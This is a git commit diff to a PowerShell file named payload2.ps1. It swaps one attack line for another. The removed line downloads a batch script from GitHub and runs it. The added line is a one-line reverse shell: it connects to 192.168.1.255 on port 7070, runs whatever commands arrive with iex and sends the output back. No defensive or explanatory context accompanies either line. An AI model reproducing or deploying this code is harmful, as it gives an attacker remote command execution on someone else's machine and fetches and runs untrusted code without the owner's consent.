bfe401b8cb81850615307395ecc9d5cb847a7b8b
Bonifyde <45215148+Bonifyde@users.noreply.github.com>
2019-06-08 01:25:58 -0400

    Update payload2.ps1

--- payload2.ps1
+++ payload2.ps1
@@ -1,1 +1,1 @@
-$url = "https://raw.githubusercontent.com/Bonifyde/Payload/master/script.bat"; $dest = "script.bat"; $web = New-Object -TypeName System.Net.WebClient; $web.DownloadFile($url,$dest); Start-Process $dest
+$sm=(New-Object Net.Sockets.TCPClient("192.168.1.255",7070)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)};
